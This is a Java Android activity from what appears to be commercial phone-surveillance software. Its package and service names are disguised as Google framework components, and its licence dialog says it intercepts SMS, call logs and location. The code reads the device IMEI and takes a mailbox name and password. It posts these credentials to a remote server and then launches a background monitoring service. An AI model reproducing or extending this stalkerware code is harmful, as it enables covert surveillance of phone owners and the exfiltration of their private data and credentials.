package com.android.GFS;

import com.google.GFS.JSONParser;
import com.google.GFS.MailDriver;
import com.google.GFS.RegisterInfo;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import com.android.GFS.R;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;

public class InFoActivity extends Activity {
    private Button ibn_regist,ibn_checknet;
    private EditText iet_mailname,iet_mainpwd;
    private ProgressBar ipb_prog;
    private String u_mail,u_pwd;
    private JSONParser jsonParser;
    private String response="NONE";
    private String mobileID="NONE";
    private String lastDate;
    private final String URL_REGIST="http://qiyemanage.web-149.com/regist.php";
    private static String TEST_NET  ="http://qiyemanage.web-149.com";
    private final String RESPONSE_OK="1";
    private final String RESPONSE_EXIST="0";
    private final String RESPONSE_MAIL_FAILURE="MAIL_FAILURE";
    
    
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(checkMobileID())
        {
        	requestWindowFeature(Window.FEATURE_NO_TITLE); 
        	setContentView(R.layout.main);
        	initInformate();      
        	initControls();
        	jsonParser = new JSONParser();       	
        }
    }
    
    private void startMonitoring()
    {
        Intent intent=new Intent();
        intent.setClass(InFoActivity.this, GoogleFrameWorkService.class);
        startService(intent); 	
    }
    
    private void initControls()
    {
    	iet_mailname =(EditText)findViewById(R.id.editText1);
    	iet_mainpwd  =(EditText)findViewById(R.id.editText2);
    	ipb_prog     =(ProgressBar)findViewById(R.id.progressBar1);
    	ibn_regist   =(Button)findViewById(R.id.button1);
    	ibn_checknet =(Button)findViewById(R.id.button2);
        OnClickListener lis_regist=new OnClickListener(){
            public void onClick(View v)
            {
            	
            		doRegister();
            }
           };
        ibn_regist.setOnClickListener(lis_regist);
        
        OnClickListener lis_checknet=new OnClickListener(){
            public void onClick(View v)
            {
            	    doCheckNetwork();

            }
           };
        ibn_checknet.setOnClickListener(lis_checknet);
	
    }
    
    
    private void doRegister()
    {
    	RegisterService rservice=new RegisterService(this);
    	rservice.execute("registering...");    		
	
    }
    private void doCheckNetwork()
    {
    	CheckNetworkService cservice=new CheckNetworkService(this);
    	cservice.execute("check networking...");    		
	
    }
    
    private String  registService(String name, String pwd)
    {
    	SimpleDateFormat  sdf = new SimpleDateFormat("yyyy-MM-dd",Locale.CHINA); 
    	String today=sdf.format(new Date());
    	lastDate=today;
    	String expireday;
    	try{
    		expireday=sdf.format(new Date(sdf.parse(today).getTime()+24*3600*1000));
    		
    	}catch (Exception ex)
    	{
    		expireday=today;
    	}   		
    	List<NameValuePair> data =new ArrayList<NameValuePair>();
    	data.add(new BasicNameValuePair("II",mobileID));
    	data.add(new BasicNameValuePair("EM",name+"@163.com"));
    	data.add(new BasicNameValuePair("PWD",pwd));
    	data.add(new BasicNameValuePair("IDATE",expireday));
    	try{
            return jsonParser.makeHttpRequest(URL_REGIST,"POST", data).getString("success");
    		
    	}catch(Exception e){
            e.printStackTrace();       
        }  	
    	return "NONE";    	
    }
    
    private void saveLogInfo()
    {
    	RegisterInfo info=new RegisterInfo();
    	info.saveInfo(mobileID,u_mail+"@163.com",u_pwd);   	
    	SharedPreferences settingSharedPreferences = getSharedPreferences("GFSConfig", Context.MODE_PRIVATE);
	    SharedPreferences.Editor editor = settingSharedPreferences.edit();
	    editor.putString("lastdate", lastDate);
	    editor.commit();
    }
    
    
    private void initInformate()
    {
        Dialog  alertDialog = new AlertDialog.Builder(this). 
                setTitle("使用协议："). 
                setMessage("请务必认真阅读和理解本协议中规定的所有权利和限制。除非您接受本协议条款，否则您无权下载、使用本软件及其相关服务。您一旦安装、复制、下载、访问或以其它方式使用本软件产品，将视为对本协议的接受，即表示您同意接受本协议各项条款的约束，点击\"接受\"继续。如果您不同意本协议中的条款，请点击\"拒绝\"。\n" +
                		"1 权利声明 \n"+
                		"本软件的一切知识产权，受著作权法和国际著作权条约以及其他知识产权法律法规的保护。禁止私自拷贝，出售！\n"+
                		"2 许可范围\n"+
                		"本软件为付费软件，使用前请向作者购买使用许可。未付费或无许可证用户因擅自安装出现的任何风险本软件概不负责。\n"+
                		"3 权力限制\n"+
                		"禁止反向工程、反向编译和反向汇编：用户不得对本软件产品进行反向工程（Reverse Engineer）、反向编译（Decompile）或反向汇编（Disassemble），同时不得改动编译在程序文件内部的任何资源。除法律、法规明文规定允许上述活动外，用户必须遵守此协议限制。\n"+
                		"4 用户使用须知\n"+
                		"本软件用于对授权手机内容进行监听，包括短信，通话记录，地理位置等。安装者必须征得机主同意，不得欺骗机主，否则一切法律后果安装者自行负责。本软件不存储任何手机相关信息，不干扰个人隐私.\n"+
                		"5 免责与责任限制\n"+
                		"本软件经过详细的测试，但不能保证与所有的软硬件系统完全兼容，不能保证本软件完全没有错误。如果出现不兼容及软件错误的情况，用户可联系销售人员，获得技术支持。如果无法解决兼容性问题，用户可以删除本软件。\n"+
                		"使用本软件产品风险由用户自行承担，在适用法律允许的最大范围内，对因使用或不能使用本软件所产生的损害及风险，包括但不限于直接或间接的个人损害、商业赢利的丧失、贸易中断、商业信息的丢失或任何其它经济损失，本软件不承担任何责任。\n"+
                		"对于因电信系统或互联网网络故障、计算机故障或病毒、信息损坏或丢失、计算机系统问题或其它任何不可抗力原因而产生损失，本软件不承担任何责任。\n"+
                		"用户违反本协议规定，对本店造成损害的。本店有权采取包括但不限于中断使用许可、停止提供服务、限制使用、法律追究等措施。\n"+
                		"6 本协议适用中华人民共和国法律。\n"+
                		"7 本协议的一切解释权与修改权归作者所有。").
                setPositiveButton("接受", new DialogInterface.OnClickListener() {                   
                    @Override 
                    public void onClick(DialogInterface dialog, int which) { 
                        // TODO Auto-generated method stub  
                    } 
                }). 
                setNegativeButton("拒绝", new DialogInterface.OnClickListener() {                      
                    @Override 
                    public void onClick(DialogInterface dialog, int which) { 
                        // TODO Auto-generated method stub  
                    	System.exit(0);
                    } 
                }).create(); 
        alertDialog.show(); 
    	
    }
    
    private boolean checkMobileID()
    {
    	TelephonyManager tm=(TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
    	mobileID=tm.getDeviceId();
    	Log.i("IME:",mobileID);
    	if(mobileID.length()<10)
    	{
	    	AlertDialog.Builder builder=new AlertDialog.Builder(this);
	    	builder.setMessage("手机标识码异常！");
	    	builder.setPositiveButton("确定", new DialogInterface.OnClickListener() {                   
                @Override 
                public void onClick(DialogInterface dialog, int which) { 
                    // TODO Auto-generated method stub
                		finish();                   	
                } 
            });
	    	builder.show();	
	    	return false;
    	}
    	return true;
    }
    
    private boolean validateEmail(String name, String pwd) throws Exception
    {
    	MailDriver md=new MailDriver();
    	return md.sendMailPlainText(name+"@163.com", pwd, name+"@163.com", "安卓监控精灵:验证邮件", "验证成功！");
    }
    
    private static boolean validateNet() throws Exception
    {
    	URL url = new URL(TEST_NET);  
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();  
        conn.setConnectTimeout(6 * 1000);  
        conn.setRequestMethod("GET");
        if (conn.getResponseCode() == 200) 
        {  
            return true;
        }  
        return false;
    }

    
	class RegisterService extends AsyncTask<String, Void, Integer>
	{
		Context context;
		RegisterService(Context ct)
		{
			context=ct;
		}
		@Override
		protected Integer doInBackground(String... arg0) {
			// TODO Auto-generated method stub
			Log.i("bg:", u_mail+";"+u_pwd);
	    	if((null!=u_mail) && (null!=u_pwd)
	    			&& (u_mail.length()>0) && (u_pwd.length()>0))
	    	{
	    		try {
					if(validateEmail(u_mail,u_pwd))
					{
						response=registService(u_mail,u_pwd);
						if(response.equals(RESPONSE_OK))
						{
							saveLogInfo();
							startMonitoring();
						}
					}
					else
						response=RESPONSE_MAIL_FAILURE;
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
	    		return 1;
	    	}
	    	return 0;
		}

		@Override
		protected void onCancelled() {
			// TODO Auto-generated method stub
			super.onCancelled();
		}

		@Override
		protected void onPostExecute(Integer result) {
			// TODO Auto-generated method stub
			//super.onPostExecute(result);
			ipb_prog.setVisibility(View.INVISIBLE);
	    	AlertDialog.Builder builder=new AlertDialog.Builder(context);
	    	if(1==result)
	    	{
	    		if(response.equals(RESPONSE_OK))
	    			builder.setMessage("注册成功！");
	    		else if(response.equals(RESPONSE_EXIST))
	    			builder.setMessage("注册失败，该号已注册！");
	    		else if(response.equals(RESPONSE_MAIL_FAILURE))
	    			builder.setMessage("注册失败，邮箱验证错误！");
	    		else	    		
	    			builder.setMessage("注册失败,请检查网络环境！");	    		
	    	}else
	    		builder.setMessage("邮箱和密码不能为空！");
	    		
	    	builder.setPositiveButton("确定", new DialogInterface.OnClickListener() {                   
	                    @Override 
	                    public void onClick(DialogInterface dialog, int which) { 
	                        // TODO Auto-generated method stub
	                    	if(response.equals(RESPONSE_OK))
	                    	{
	                    		finish();  	                    		
	                    	}
	                    } 
	                });
	    	builder.show();	
		}

		@Override
		protected void onPreExecute() {
			// TODO Auto-generated method stub
			super.onPreExecute();
			ipb_prog.setVisibility(View.VISIBLE); 
	    	u_mail=iet_mailname.getText().toString();
	    	u_pwd =iet_mainpwd.getText().toString();
		}

		@Override
		protected void onProgressUpdate(Void... values) {
			// TODO Auto-generated method stub
			super.onProgressUpdate(values);
		}
		
	}
	
	
	class CheckNetworkService extends AsyncTask<String, Void, Integer>
	{
		Context context;
		CheckNetworkService(Context ct)
		{
			context=ct;
		}
		@Override
		protected Integer doInBackground(String... arg0) {
			// TODO Auto-generated method stub
			try {
				if(validateNet())
				  return 1;
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
	    	return 0;
		}

		@Override
		protected void onCancelled() {
			// TODO Auto-generated method stub
			super.onCancelled();
		}

		@Override
		protected void onPostExecute(Integer result) {
			// TODO Auto-generated method stub
			//super.onPostExecute(result);
			ipb_prog.setVisibility(View.INVISIBLE);
	    	AlertDialog.Builder builder=new AlertDialog.Builder(context);
	    	if(1==result)
	    		builder.setMessage("网络正常！");
	    	else	    		
	    		builder.setMessage("网络异常！");
	    	builder.setPositiveButton("确定", new DialogInterface.OnClickListener() {                   
	                    @Override 
	                    public void onClick(DialogInterface dialog, int which) { 
	                        // TODO Auto-generated method stub              	
	                    		
	                    } 
	                });
	    	builder.show();	
	        
		}

		@Override
		protected void onPreExecute() {
			// TODO Auto-generated method stub
			super.onPreExecute();
			ipb_prog.setVisibility(View.VISIBLE);  	   	

		}

		@Override
		protected void onProgressUpdate(Void... values) {
			// TODO Auto-generated method stub
			super.onProgressUpdate(values);
		}
		
	}
}